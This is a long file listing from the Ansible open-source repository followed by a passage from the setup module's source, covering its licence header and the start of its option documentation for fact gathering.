openstack_guidelines.rst ovirt_dev_guide.rst vmware_guidelines.rst vmware_rest_guidelines.rst licensing.txt basic_rules.rst grammar_punctuation.rst commas-matter-2.jpg commas-matter.jpg hyphen-funny.jpg thenvsthan.jpg index.rst resources.rst search_hints.rst spelling_word_choice.rst trademarks.rst voice_style.rst why_use.rst action-plugin-docs.rst ansible-doc.rst ansible-requirements.rst ansible-test-future-boilerplate.rst ansible-var-precedence-check.rst azure-requirements.rst boilerplate.rst changelog.rst compile.rst configure-remoting-ps1.rst deprecated-config.rst docs-build.rst empty-init.rst future-import-boilerplate.rst ignores.rst import.rst line-endings.rst metaclass-boilerplate.rst mypy.rst no-assert.rst no-basestring.rst no-dict-iteritems.rst no-dict-iterkeys.rst no-dict-itervalues.rst no-get-exception.rst no-illegal-filenames.rst no-main-display.rst no-smart-quotes.rst no-tests-as-filters.rst no-underscore-variable.rst no-unicode-literals.rst no-unwanted-files.rst no-wildcard-import.rst obsolete-files.rst package-data.rst pep8.rst pslint.rst pylint-ansible-test.rst pylint.rst replace-urlopen.rst required-and-default-attributes.rst rstcheck.rst runtime-metadata.rst sanity-docs.rst shebang.rst shellcheck.rst symlinks.rst test-constraints.rst update-bundled.rst use-argspec-type-path.rst use-compat-six.rst validate-modules.rst yamllint.rst testing.rst testing_compile.rst testing_documentation.rst testing_httptester.rst testing_integration.rst testing_integration_legacy.rst testing_pep8.rst testing_running_locally.rst testing_sanity.rst testing_units.rst testing_units_modules.rst testing_validate-modules.rst dev_guide.rst user_guide.rst first_playbook_output.txt ping_inventory_output.txt ping_output.txt get_started_inventory.rst get_started_playbook.rst index.rst first_playbook.yaml inventory_example_vms.yaml inventory_group_structure.yaml inventory_variables_group.yaml inventory_variables_host.yaml ansible_basic.svg cow.png index.rst installation_distros.rst intro_configuration.rst intro_installation.rst implicit_localhost.rst 404.po api.po cli.po collections.po community.po dev_guide.po galaxy.po index.po installation_guide.po inventory.po network.po plugins.po porting_guides.po reference_appendices.po roadmap.po scenario_guides.po developing_plugins_network.rst developing_resource_modules_network.rst documenting_modules_network.rst index.rst basic_concepts.rst first_inventory.rst first_playbook.rst index.rst intermediate_concepts.rst network_connection_options.rst network_differences.rst network_resources.rst network_roles.rst first_playbook.yml first_playbook_ext.yml index.rst cli_parsing.rst faq.rst index.rst network_best_practices_2.5.rst network_debug_troubleshooting.rst network_resource_modules.rst network_working_with_command_output.rst platform_ce.rst platform_cnos.rst platform_dellos10.rst platform_dellos6.rst platform_dellos9.rst platform_enos.rst platform_eos.rst platform_eric_eccli.rst platform_exos.rst platform_frr.rst platform_icx.rst platform_index.rst platform_ios.rst platform_iosxr.rst platform_ironware.rst platform_junos.rst platform_meraki.rst platform_netconf_enabled.rst platform_netvisor.rst platform_nos.rst platform_nxos.rst platform_routeros.rst platform_slxos.rst platform_voss.rst platform_vyos.rst platform_weos4.rst SSH_warning.txt validate.rst action.rst become.rst cache.rst callback.rst cliconf.rst connection.rst docs_fragment.rst filter.rst httpapi.rst index.html inventory.rst lookup.rst module.rst module_util.rst netconf.rst plugins.rst shell.rst strategy.rst terminal.rst test.rst vars.rst core_porting_guides.rst porting_guides.rst porting_guide_2.0.rst porting_guide_2.10.rst porting_guide_2.3.rst porting_guide_2.4.rst porting_guide_2.5.rst porting_guide_2.6.rst porting_guide_2.7.rst porting_guide_2.8.rst porting_guide_2.9.rst porting_guide_3.rst porting_guide_4.rst porting_guide_5.rst porting_guide_6.rst porting_guide_base_2.10.rst porting_guide_core_2.11.rst porting_guide_core_2.12.rst porting_guide_core_2.13.rst .rstcheck.cfg automationhub.rst common_return_values.rst faq.rst general_precedence.rst glossary.rst interpreter_discovery.rst logging.rst module_utils.rst python_3_support.rst release_and_maintenance.rst special_variables.rst test_strategies.rst tower.rst YAMLSyntax.rst ansible_core_roadmap_index.rst ansible_roadmap_index.rst COLLECTIONS_2_10.rst COLLECTIONS_3_0.rst COLLECTIONS_4.rst COLLECTIONS_5.rst COLLECTIONS_6.rst index.rst old_roadmap_index.rst ROADMAP_2_10.rst ROADMAP_2_11.rst ROADMAP_2_12.rst ROADMAP_2_13.rst ROADMAP_2_5.rst ROADMAP_2_6.rst ROADMAP_2_7.rst ROADMAP_2_8.rst ROADMAP_2_9.rst cloud_guides.rst guides.rst guide_aci.rst guide_alicloud.rst guide_aws.rst guide_azure.rst guide_cloudstack.rst guide_docker.rst guide_gce.rst guide_infoblox.rst guide_meraki.rst guide_online.rst guide_oracle.rst guide_packet.rst guide_rax.rst guide_scaleway.rst guide_vagrant.rst guide_vmware_rest.rst guide_vultr.rst network_guides.rst scenario_template.rst virt_guides.rst authentication.rst collect_information.rst create_vm.rst installation.rst run_a_vm.rst Add_a_floppy Add_a_floppy_disk_drive.result.json Add_a_floppy_disk_drive.task.yaml Attach_an_IS Attach_an_ISO_image_to_a_guest_VM.result.json Attach_an_ISO_image_to_a_guest_VM.task.yaml Attach_a_VM_ Attach_a_VM_to_a_dvswitch.result.json Attach_a_VM_to_a_dvswitch.task.yaml Build_a_list Build_a_list_of_all_the_clusters.result.json Build_a_list_of_all_the_clusters.task.yaml Build_a_list_of_all_the_folders.result.json Build_a_list_of_all_the_folders.task.yaml Build_a_list_of_all_the_folders_with_the_type_VIRTUAL_MACHINE_and_called_vm.result.json Build_a_list_of_all_the_folders_with_the_type_VIRTUAL_MACHINE_and_called_vm.task.yaml Change_vm-to Change_vm-tools_upgrade_policy_to_MANUAL.result.json Change_vm-tools_upgrade_policy_to_MANUAL.task.yaml Change_vm-tools_upgrade_policy_to_UPGRADE_AT_POWER_CYCLE.result.json Change_vm-tools_upgrade_policy_to_UPGRADE_AT_POWER_CYCLE.task.yaml collect_a_li collect_a_list_of_the_datacenters.result.json collect_a_list_of_the_datacenters.task.yaml Collect_info Collect_information_about_a_specific_VM.result.json Collect_information_about_a_specific_VM.task.yaml Collect_the_ Collect_the_hardware_information.result.json Collect_the_hardware_information.task.yaml Create_a_new Create_a_new_disk.result.json Create_a_new_disk.task.yaml Create_a_SAT Create_a_SATA_adapter_at_PCI_slot_34.result.json Create_a_SATA_adapter_at_PCI_slot_34.task.yaml Create_a_VM. Create_a_VM.result.json Create_a_VM.task.yaml Dedicate_one Dedicate_one_core_to_the_VM.result.json Dedicate_one_core_to_the_VM.task.yaml Get_guest_fi Get_guest_filesystem_information.result.json Get_guest_filesystem_information.task.yaml Get_guest_id Get_guest_identity_information.result.json Get_guest_identity_information.task.yaml Get_guest_ne Get_guest_networking_information.result.json Get_guest_networking_information.task.yaml Get_guest_network_interfaces_information.result.json Get_guest_network_interfaces_information.task.yaml Get_guest_network_routes_information.result.json Get_guest_network_routes_information.task.yaml Get_guest_po Get_guest_power_information.result.json Get_guest_power_information.task.yaml Get_VM_stora Get_VM_storage_policy.result.json Get_VM_storage_policy.task.yaml Increase_the Increase_the_memory_of_a_VM.result.json Increase_the_memory_of_a_VM.task.yaml List_the_cdr List_the_cdrom_devices_on_the_guest.result.json List_the_cdrom_devices_on_the_guest.task.yaml List_the_SCS List_the_SCSI_adapter_of_a_given_VM.result.json List_the_SCSI_adapter_of_a_given_VM.task.yaml Look_up_the_ Look_up_the_VM_called_test_vm1_in_the_inventory.result.json Look_up_the_VM_called_test_vm1_in_the_inventory.task.yaml Remove_SATA_ Remove_SATA_adapter_at_PCI_slot_34.result.json Retrieve_a_l Retrieve_a_list_of_all_the_datastores.result.json Retrieve_a_list_of_all_the_datastores.task.yaml Retrieve_det Retrieve_details_about_the_first_cluster.result.json Retrieve_details_about_the_first_cluster.task.yaml Retrieve_the Retrieve_the_disk_information_from_the_VM.result.json Retrieve_the_disk_information_from_the_VM.task.yaml Retrieve_the_memory_information_from_the_VM.result.json Retrieve_the_memory_information_from_the_VM.task.yaml Turn_the_NIC Turn_the_NIC's_start_connected_flag_on.result.json Turn_the_NIC's_start_connected_flag_on.task.yaml Turn_the_pow Turn_the_power_of_the_VM_on.result.json Turn_the_power_of_the_VM_on.task.yaml Upgrade_the_ Upgrade_the_VM_hardware_version.result.json Upgrade_the_VM_hardware_version.task.yaml Wait_until_m Wait_until_my_VM_is_ready.result.json Wait_until_my_VM_is_ready.task.yaml vm_hardware_tuning.rst vm_info.rst vm_tool_configuration.rst vm_tool_information.rst basic_concepts.txt download_tarball_collections.txt galaxy_server_list.txt installing_collections.txt installing_collections_file.rst installing_collections_git_repo.txt installing_multiple_collections.txt installing_older_collection.txt basic_concepts.rst become.rst cheatsheet.rst collections_using.rst command_line_tools.rst complex_data_manipulation.rst connection_details.rst guide_rolling_upgrade.rst index.rst intro.rst intro_adhoc.rst intro_bsd.rst intro_dynamic_inventory.rst intro_inventory.rst intro_patterns.rst intro_windows.rst modules.rst modules_intro.rst modules_support.rst playbooks.rst playbooks_advanced_syntax.rst playbooks_async.rst playbooks_best_practices.rst playbooks_blocks.rst playbooks_checkmode.rst playbooks_conditionals.rst playbooks_debugger.rst playbooks_delegation.rst playbooks_environment.rst playbooks_error_handling.rst playbooks_filters.rst playbooks_filters_ipaddr.rst playbooks_handlers.rst playbooks_intro.rst playbooks_lookups.rst playbooks_loops.rst playbooks_module_defaults.rst playbooks_prompts.rst playbooks_python_version.rst playbooks_reuse.rst playbooks_reuse_includes.rst playbooks_reuse_roles.rst playbooks_roles.rst playbooks_special_topics.rst playbooks_startnstep.rst playbooks_strategies.rst playbooks_tags.rst playbooks_templating.rst playbooks_tests.rst playbooks_variables.rst playbooks_vars_facts.rst playbooks_vault.rst playbook_pathing.rst plugin_filtering_config.rst sample_setup.rst role_directory.txt SSH_password_prompt.txt with2loop.txt vault.rst windows.rst windows_dsc.rst windows_faq.rst windows_performance.rst windows_setup.rst windows_usage.rst windows_winrm.rst 2.10_conf.py all_conf.py ansible_conf.py core_conf.py variables.dot core-color-scheme.css .gitignore ansible-config.1 ansible-console.1 ansible-doc.1 ansible-galaxy.1 ansible-inventory.1 ansible-playbook.1 ansible-pull.1 ansible-vault.1 ansible.1 .gitdir cli_rst.j2 collections_galaxy_meta.rst.j2 config.rst.j2 man.j2 modules_by_category.rst.j2 playbooks_keywords.rst.j2 ansible.cfg hosts ConfigureRemotingForAnsible.ps1 upgrade_to_ps3.ps1 build-ansible.py announce.py change_detection.py commands.py collection_meta.py docs_build.py dump_config.py dump_keywords.py file_deprecated_issues.py generate_man.py porting_guide.py release_announcement.py update_intersphinx.py errors.py __init__.py __init__.py test-module.py update-sanity-requirements.py adhoc.py option_helpers.py __init__.py config.py console.py doc.py galaxy.py inventory.py playbook.py pull.py ansible_connection_cli_stub.py __init__.py vault.py __init__.py list.py __init__.py __init__.py __init__.py ansible_builtin_runtime.yml base.yml data.py manager.py __init__.py constants.py context.py yaml_strings.py __init__.py action_write_locks.py python_target.py __init__.py interpreter_discovery.py module_common.py playbook_executor.py play_iterator.py async_watchdog.ps1 async_wrapper.ps1 become_wrapper.ps1 bootstrap_wrapper.ps1 coverage_wrapper.ps1 exec_wrapper.ps1 module_manifest.py module_powershell_wrapper.ps1 module_script_wrapper.ps1 module_wrapper.ps1 __init__.py worker.py __init__.py stats.py task_executor.py task_queue_manager.py task_result.py __init__.py api.py concrete_artifact_manager.py galaxy_api_proxy.py gpg.py __init__.py .travis.yml apb.yml.j2 main.yml.j2 Dockerfile.j2 .git_keep main.yml.j2 Makefile.j2 main.yml.j2 deprovision.yml.j2 provision.yml.j2 README.md main.yml.j2 .git_keep ansible.cfg inventory test.yml.j2 main.yml.j2 collections_galaxy_meta.yml .travis.yml main.yml.j2 .git_keep main.yml.j2 container.yml.j2 main.yml.j2 README.md main.yml.j2 .git_keep ansible.cfg inventory test.yml.j2 main.yml.j2 .git_keep galaxy.yml.j2 README.md.j2 README.md.j2 .git_keep .travis.yml main.yml.j2 .git_keep main.yml.j2 main.yml.j2 README.md main.yml.j2 .git_keep inventory test.yml.j2 main.yml.j2 .travis.yml example.py.j2 main.yml.j2 .git_keep example_command.py.j2 example_config.py.j2 example_facts.py.j2 main.yml.j2 example.py.j2 example.py.j2 README.md main.yml.j2 .git_keep example.py.j2 inventory test.yml.j2 main.yml.j2 dataclasses.py errors.py providers.py reporters.py resolvers.py versioning.py __init__.py role.py token.py user_agent.py __init__.py data.py group.py helpers.py host.py manager.py __init__.py keyword_desc.yml add_host.py apt.py apt_key.py apt_repository.py assemble.py assert.py async_status.py async_wrapper.py blockinfile.py command.py copy.py cron.py debconf.py debug.py dnf.py dpkg_selections.py expect.py fail.py fetch.py file.py find.py gather_facts.py getent.py get_url.py git.py group.py group_by.py hostname.py import_playbook.py import_role.py import_tasks.py include_role.py include_tasks.py include_vars.py iptables.py known_hosts.py lineinfile.py meta.py package.py package_facts.py pause.py ping.py pip.py raw.py reboot.py replace.py rpm_key.py script.py service.py service_facts.py setup.py set_fact.py set_stats.py shell.py slurp.py stat.py subversion.py systemd.py sysvinit.py tempfile.py template.py unarchive.py uri.py user.py validate_argument_spec.py wait_for.py wait_for_connection.py yum.py yum_repository.py _include.py __init__.py ansible_release.py api.py basic.py arg_spec.py collections.py dict_transformations.py file.py json.py locale.py network.py parameters.py process.py respawn.py sys_info.py converters.py formatters.py __init__.py validation.py warnings.py yaml.py _collections_compat.py _json_compat.py _utils.py __init__.py importlib.py paramiko.py selectors.py selinux.py typing.py version.py _selectors2.py __init__.py connection.py Ansible.AccessToken.cs Ansible.Basic.cs Ansible.Become.cs Ansible.Privilege.cs Ansible.Process.cs __init__.py _distro.py __init__.py errors.py ansible_collector.py collector.py compat.py default_collectors.py aix.py base.py darwin.py dragonfly.py freebsd.py hpux.py hurd.py linux.py netbsd.py openbsd.py sunos.py __init__.py namespace.py aix.py base.py darwin.py dragonfly.py fc_wwn.py freebsd.py generic_bsd.py hpux.py hurd.py iscsi.py linux.py netbsd.py nvme.py openbsd.py sunos.py __init__.py facter.py ohai.py __init__.py packages.py sysctl.py apparmor.py caps.py chroot.py cmdline.py date_time.py distribution.py dns.py env.py fips.py local.py lsb.py pkg_mgr.py platform.py python.py selinux.py service_mgr.py ssh_pub_keys.py user.py __init__.py timeout.py utils.py base.py dragonfly.py freebsd.py hpux.py linux.py netbsd.py openbsd.py sunos.py sysctl.py __init__.py __init__.py json_utils.py convert_bool.py __init__.py Ansible.ModuleUtils.AddType.psm1 Ansible.ModuleUtils.ArgvParser.psm1 Ansible.ModuleUtils.Backup.psm1 Ansible.ModuleUtils.CamelConversion.psm1 Ansible.ModuleUtils.CommandUtil.psm1 Ansible.ModuleUtils.FileUtil.psm1 Ansible.ModuleUtils.Legacy.psm1 Ansible.ModuleUtils.LinkUtil.psm1 Ansible.ModuleUtils.PrivilegeUtil.psm1 Ansible.ModuleUtils.SID.psm1 Ansible.ModuleUtils.WebRequest.psm1 __init__.py pycompat24.py service.py __init__.py splitter.py urls.py yumdnf.py _text.py __init__.py ajson.py dataloader.py mod_args.py plugin_docs.py quoting.py splitter.py addresses.py jsonify.py yaml.py __init__.py __init__.py constructor.py dumper.py loader.py objects.py __init__.py __init__.py attribute.py base.py block.py collectionsearch.py conditional.py handler.py handler_task_include.py helpers.py included_file.py loop_control.py play.py playbook_include.py play_context.py definition.py include.py metadata.py requirement.py __init__.py role_include.py taggable.py task.py task_include.py __init__.py add_host.py assemble.py assert.py async_status.py command.py copy.py debug.py fail.py fetch.py gather_facts.py group_by.py include_vars.py normal.py package.py pause.py raw.py reboot.py script.py service.py set_fact.py set_stats.py shell.py template.py unarchive.py uri.py validate_argument_spec.py wait_for_connection.py yum.py __init__.py runas.py su.py sudo.py __init__.py base.py jsonfile.py memory.py __init__.py default.py junit.py minimal.py oneline.py tree.py __init__.py __init__.py local.py paramiko_ssh.py psrp.py ssh.py winrm.py __init__.py action_common_attributes.py action_core.py backup.py connection_pipelining.py constructed.py decrypt.py default_callback.py files.py inventory_cache.py result_format_callback.py return_common.py shell_common.py shell_windows.py template_common.py url.py url_windows.py validate.py vars_plugin_staging.py __init__.py core.py encryption.py mathstuff.py urls.py urlsplit.py __init__.py __init__.py advanced_host_list.py auto.py constructed.py generator.py host_list.py ini.py script.py toml.py yaml.py __init__.py loader.py config.py csvfile.py dict.py env.py file.py fileglob.py first_found.py indexed_items.py ini.py inventory_hostnames.py items.py lines.py list.py nested.py password.py pipe.py random_choice.py sequence.py subelements.py template.py together.py unvault.py url.py varnames.py vars.py __init__.py __init__.py cmd.py powershell.py sh.py __init__.py debug.py free.py host_pinned.py linear.py __init__.py __init__.py core.py files.py mathstuff.py __init__.py host_group_vars.py __init__.py __init__.py release.py native_helpers.py template.py vars.py __init__.py cmd_functions.py _collection_config.py _collection_finder.py _collection_meta.py __init__.py color.py context_objects.py display.py encrypt.py fqcn.py galaxy.py hashing.py helpers.py jsonrpc.py listify.py lock.py multiprocessing.py native_jinja.py path.py plugin_docs.py py3compat.py sentinel.py shlex.py singleton.py ssh_functions.py unicode.py unsafe_proxy.py vars.py version.py _junit_xml.py __init__.py clean.py fact_cache.py hostvars.py manager.py plugins.py reserved.py __init__.py __init__.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt Apache-License.txt MIT-license.txt PSF-license.txt simplified_bsd.txt Makefile MANIFEST.in Makefile version_helper_test.py __init__.py version_helper.py __init__.py check-link-behavior.py PKG-INFO pyproject.toml README.rst requirements.txt setup.cfg setup.py Makefile test_diff.py test_validate_modules_regex.py network-integration.cfg network-integration.requirements.txt aliases main.yml aliases runme.sh aliases check_rlimit_and_maxfd.py custom_module.py sys_check.py custom_util.py main.yml adhoc-callback.stdout aliases ansible-test_.cfg ansible-testé.cfg callback_debug.py callback_meta.py module_common_regex_regression.sh no-extension playbook.yml playbookdir_cfg.ini runme.sh vars.yml aliases MANIFEST.json notjsonfile.py statichost.py noop.py fakemodule.py notrealmodule.py randommodule.py noop_vars_plugin.py MANIFEST.json notjsonfile.py statichost.py noop.py fakemodule.py notrealmodule.py randommodule.py noop_vars_plugin.py main.yml empty MANIFEST.json deprecation.py module.py plugin.py version_added.py fakecollrole.output fakemodule.output fakerole.output inventory test_docs.py test_docs_missing_description.py test_docs_non_iterable_status.py test_docs_no_metadata.py test_docs_no_status.py test_docs_removed_precedence.py test_docs_removed_status.py test_docs_returns.py test_docs_returns_broken.py test_docs_suboptions.py test_docs_yaml_anchors.py test_empty.py test_no_docs.py test_no_docs_non_iterable_status.py test_no_docs_no_metadata.py test_no_docs_no_status.py noop.output noop_vars_plugin.output notjsonfile.output randommodule-text.output randommodule.output argument_specs.yml main.yml empty main.yml runme.sh test.yml test_docs_returns.output test_docs_suboptions.output test_docs_yaml_anchors.output main.yml README.txt aliases cleanup-default.yml cleanup-freebsd.yml cleanup.yml testserver.py runme.sh setup.yml aliases build_bad_tar.py test_module.py reset_pulp.py setup_collections.py main.yml build.yml download.yml fail_fast_resolvelib.ym fail_fast_resolvelib.yml init.yml install.yml list.yml main.yml publish.yml pulp.yml revoke_gpg_key.yml setup_gpg.yml supported_resolvelib.ym supported_resolvelib.yml unsupported_resolvelib. unsupported_resolvelib.yml upgrade.yml verify.yml ansible.cfg.j2 main.yml aliases main.yml download.yml empty_installed_col empty_installed_collections.yml individual_collecti individual_collection_repo.yml main.yml multi_collection_re multi_collection_repo_all.yml multi_collection_repo_individual.yml reinstalling.yml requirements.yml scm_dependency.yml scm_dependency_dedu scm_dependency_deduplication.yml setup.yml setup_collection_ba setup_collection_bad_version.yml setup_multi_collect setup_multi_collection_repo.yml setup_recursive_scm setup_recursive_scm_dependency.yml test_invalid_versio test_invalid_version.yml test_supported_reso test_supported_resolvelib_versions.yml git_prefix_name git_prefix_name.yml name_and_type.y name_and_type.yml name_without_ty name_without_type.yml source_and_name source_and_name.yml source_and_name_and_type.yml source_only.yml main.yml aliases main.yml main.yml aliases invalid_sample.yml unicode.yml valid_sample.yml main.yml aliases cleanup.yml ansible.cfg inventory local.yml multi_play_1.yml multi_play_2.yml runme.sh setup.yml aliases adhoc_example1.py constraints.txt playbook_example1.py parse.py inventory runme.sh adhoc_example1.yml main.yml playbook_example1.yml setup.yml test.yml aliases galaxy.yml runtime.ym runtime.yml check_pylint.py bad.py vendor1.py vendor2.py world.py bad.py hello.py no_callable.py my_util.py __init__.py bad.py README.rst bad.py main.yml ignore.txt test_hello.py test_my_util.py constraints.txt requirements.txt aliases main.yml constraints.txt test_constraints.py requirements.txt runtime.yml validate.ps1 validate.py validate.psm1 coverage.sh git-at-collection-base.sh git-at-collection-root.sh git-common.bash install-git.yml integration-constraints.sh integration.sh sanity-vendor.sh sanity.sh uninstall-git.yml units-constraints.sh units.sh unsupported-directory.sh update-ignore.py validate-modules-collection-loader.sh venv-pythons.py runme.sh aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases main.yml aliases galaxy.yml ps_util.py hello.py win_util_args.ps1 win_util_args.py my_util.py PSUtil.psm1 main.yml test_hello.py test_my_util.py docker.sh runme.sh aliases runme.py runme.sh aliases empty-password encrypted-vault-password encrypted_file_encrypted_var_password example1_password example2_password example3_password faux-editor.py nonsecret.txt secret.vault format_1_1_AES256.yml format_1_2_AES256.yml myhost.yml testhost.yml broken-group-vars-tasks.yml broken-host-vars-tasks.yml broken-group-vars.yml vars inventory original-broken-host-vars original-group-vars.yml README.md some-vars vault-secret inventory.toml password-script.py main.yml main.yml main.yml vaulted_template.j2 main.yml main.yml main.yml main.yml README.md main.yml main.yml runme.sh single_vault_as_string.yml test-vault-client.py test_dangling_temp.yml test_utf8_value_in_filename.yml test_vault.yml test_vaulted_inventory.yml test_vaulted_inventory_toml.yml test_vaulted_template.yml test_vaulted_utf8_value.yml test_vault_embedded.yml test_vault_embedded_ids.yml test_vault_file_encrypted_embedded.yml vault-café.yml vault-password vault-password-ansible vault-password-wrong vault-secret.txt vaulted.inventory 50897.yml aliases always_block.yml inventory on_includes.yml play_level.yml runme.sh test_fatal.yml aliases main.yml main.yml main.yml apt-builddep.yml apt-multiarch.yml apt.yml downgrade.yml main.yml repo.yml upgrade.yml url-with-deps.yml default.yml Ubuntu-20.yml aliases main.yml apt_key.yml apt_key_binary.yml apt_key_inline_data.yml file.yml main.yml aliases main.yml apt.yml cleanup.yml main.yml mode.yaml mode_cleanup.yaml aliases runme.sh aliases argspec.py main.yml password_no_log.yml aliases fragment1 fragment2 fragment3 fragment4 fragment5 main.yml main.yml aliases assert_quiet.out.quiet.stderr assert_quiet.out.quiet.stdout inventory quiet.yml runme.sh aliases callback_test.yml async_test.py main.yml main.yml aliases junkping.py runme.sh test_async.yml normal.py aliases async_test.py main.yml main.yml aliases baz.txt default.yml main.yml su.yml sudo.yml bar.j2 default.yml aliases runme.sh tmpdir.py aliases test.yml cleanup_unpriv_users.yml cleanup.yml setup.yml test.yml inventory runme.sh setup_unpriv_users.yml aliases b64_latin1 b64_utf8 from_playbook main.yml main.yml b64_latin1_template.j2 b64_utf8_template.j2 from_playbook_template.j2 main.yml aliases download_binary_modules.yml all .gitignore helloworld.go Makefile main.yml test.sh test_binary_modules.yml aliases runme.sh aliases runme.sh aliases sshd_config main.yml add_block_to_existing_file.yml block_without_trailing_newline.yml create_file.yml diff.yml file_without_trailing_newline.yml insertafter.yml insertbefore.yml main.yml preserve_line_endings.yml validate.yml 69848.yml aliases always_failure_no_rescue_rc.yml always_failure_with_rescue_rc.yml always_no_rescue_rc.yml block_fail.yml block_fail_tasks.yml block_in_rescue.yml block_rescue_vars.yml fail.yml finalized_task.yml inherit_notify.yml issue29047.yml issue29047_tasks.yml issue71306.yml main.yml nested_fail.yml nested_nested_fail.yml main.yml main.yml main.yml main.yml runme.sh unsafe_failed_task.yml aliases runme.sh test-vars_prompt.py unsafe.yml unsupported.yml vars_prompt-1.yml vars_prompt-2.yml vars_prompt-3.yml vars_prompt-4.yml vars_prompt-5.yml vars_prompt-6.yml vars_prompt-7.yml aliases callback_default.out.check_markers_dry.stderr callback_default.out.check_markers_dry.stdout callback_default.out.check_markers_wet.stderr callback_default.out.check_markers_wet.stdout callback_default.out.check_nomarkers_dry.stderr callback_default.out.check_nomarkers_dry.stdout callback_default.out.check_nomarkers_wet.stderr callback_default.out.check_nomarkers_wet.stdout callback_default.out.default.stderr callback_default.out.default.stdout callback_default.out.display_path_on_failure.stderr callback_default.out.display_path_on_failure.stdout callback_default.out.failed_to_stderr.stderr callback_default.out.failed_to_stderr.stdout callback_default.out.fqcn_free.stdout callback_default.out.free.stdout callback_default.out.hide_ok.stderr callback_default.out.hide_ok.stdout callback_default.out.hide_skipped.stderr callback_default.out.hide_skipped.stdout callback_default.out.hide_skipped_ok.stderr callback_default.out.hide_skipped_ok.stdout callback_default.out.host_pinned.stdout callback_default.out.result_format_yaml.stderr callback_default.out.result_format_yaml.stdout callback_default.out.result_format_yaml_lossy_verbose.stderr callback_default.out.result_format_yaml_lossy_verbose.stdout callback_default.out.result_format_yaml_verbose.stderr callback_default.out.result_format_yaml_verbose.stdout callback_default.out.yaml_result_format_yaml_verbose.stderr callback_default.out.yaml_result_format_yaml_verbose.stdout include_me.yml inventory no_implicit_meta_banners.yml runme.sh test.yml test_2.yml test_async.yml test_dryrun.yml test_non_lockstep.yml test_yaml.yml aliases main.yml main.yml aliases check_mode-not-on-cli.yml check_mode-on-cli.yml check_mode.yml main.yml main.yml foo.txt main.yml foo.j2 main.yml runme.sh aliases runme.sh setup.yml test-cli.py test_k_and_K.py vaultsecret testvault.yml main.yml syntax_check.yml a.statichost.yml aliases ping.py test_ansiballz_cache_dupe_shortname.yml cache.statichost.yml check_populated_inventory.yml action1.py action1.py module1.py custom_jsonfile.py statichost.py contentadjmodule.py foomodule.py __init__.py __init__.py custom_adj_vars.py systestmodule.py maskedmodule.py testmodule.py main.yml ping.py bullmodule.py submod.py __init__.py broken_filter.py runtime.yml default_collection_playbook.yml play.yml embedded_module.py main.yml main.yml play.yml play.yml subdir_ping_action.py bypass_host_loop.py plugin_lookup.py subclassed_normal.py uses_redirected_import.py usercallback.py localconn.py frag.py my_subdir_filters.py myfilters.py myfilters2.py my_subdir_lookup.py mylookup.py mylookup2.py deprecated_ping.py subdir_ping_module.py ping.py testmodule.py testmodule_bad_docfrags.py uses_base_mu_granular_nested_import.py uses_collection_redirected_mu.py uses_core_redirected_mu.py uses_leaf_mu_flat_import.bak uses_leaf_mu_flat_import.py uses_leaf_mu_flat_import.yml uses_leaf_mu_granular_import.py uses_leaf_mu_module_import_from.py uses_mu_missing.py uses_mu_missing_redirect_collection.py uses_mu_missing_redirect_module.py uses_nested_same_as_func.py uses_nested_same_as_module.py win_csbasic_only.ps1 win_selfcontained.ps1 win_selfcontained.py win_uses_coll_csmu.ps1 win_uses_coll_psmu.ps1 win_uses_optional.ps1 AnotherCSMU.cs base.py leaf.py MyCSMU.cs MyCSMUOptional.cs MyPSMU.psm1 MyPSMUOptional.psm1 nested_same.py __init__.py __init__.py secondary.py subcs.cs submod.py subps.psm1 __init__.py mod_in_subpkg_with_init.py __init__.py subpkg_with_init.py mytests.py mytests2.py my_subdir_tests.py custom_vars.py main.yml main.yml main.yml main.yml main.yml main.yml main.yml main.yml main.yml main.yml main.yml runtime.yml v1_vars_plugin.py v2_vars_plugin.py override_formerly_core_masked_filter.py import_collection_,"# -*- coding: utf-8 -*-

# (c) 2012, Michael DeHaan <michael.dehaan@gmail.com>
# GNU General Public License v3.0+ (see COPYING or https://www.gnu.org/licenses/gpl-3.0.txt)

from __future__ import absolute_import, division, print_function
__metaclass__ = type


DOCUMENTATION = '''
---
module: setup
version_added: historical
short_description: Gathers facts about remote hosts
options:
    gather_subset:
        version_added: ""2.1""
        description:
            - ""If supplied, restrict the additional facts collected to the given subset.
              Possible values: C(all), C(all_ipv4_addresses), C(all_ipv6_addresses), C(apparmor), C(architecture),
              C(caps), C(chroot),C(cmdline), C(date_time), C(default_ipv4), C(default_ipv6), C(devices),
              C(distribution), C(distribution_major_version), C(distribution_release), C(distribution_version),
              C(dns), C(effective_group_ids), C(effective_user_id), C(env), C(facter), C(fips), C(hardware),
              C(interfaces), C(is_chroot), C(iscsi), C(kernel), C(local), C(lsb), C(machine), C(machine_id),
              C(mounts), C(network), C(ohai), C(os_family), C(pkg_mgr), C(platform), C(processor), C(processor_cores),
              C(processor_count), C(python), C(python_version), C(real_user_id), C(selinux), C(service_mgr),
              C(ssh_host_key_dsa_public), C(ssh_host_key_ecdsa_public), C(ssh_host_key_ed25519_public),
              C(ssh_host_key_rsa_public), C(ssh_host_pub_keys), C(ssh_pub_keys), C(system), C(system_capabilities),
              C(system_capabilities_enforced), C(user), C(user_dir), C(user_gecos), C(user_gid), C(user_id),
              C(user_shell), C(user_uid), C(virtual), C(virtualization_role), C(virtualization_type).
             Can specify a list of values to specify a larger subset.
             Values can also be used with an initial C(!) to specify that
              that specific subset should not be collected.  For instance:
              C(!hardware,!network,!virtual,!ohai,!facter). If C(!all) is specified
              then only the min subset is collected. To avoid collecting even the
              min subset, specify C(!all,!min). To collect only specific facts,
              use C(!all,!min), and specify the particular fact subsets.
              Use the filter parameter if you do not want to display some collected
              facts.""
        type: list
        elements: str
        default: ""all""
    gather_timeout:
        version_added: ""2.2""
        description:
            - Set the default timeout in seconds for individual fact gathering.
        type: int
        default: 10
    filter:
        version_added: ""1.1""
        description:
            - If supplied, only return facts that match one of the shell-style
              (fnmatch) pattern. An empty list basically means 'no filter'.
              As of Ansible 2.11, the type has changed from string to list
              and the default has became an empty list. A simple string is
              still accepted and works as a single pattern. The behaviour
              prior to Ansible 2.11 remains.
        type: list
        elements: str
        default: []
    fact_path:
        version_added: ""1.3""
        description:
            - Path used for local ansible facts (C(*.fact)) - files in this dir
              will be run (if executable) and their results be added to C(ansible_local) facts.
              If a file is not executable it is read instead.
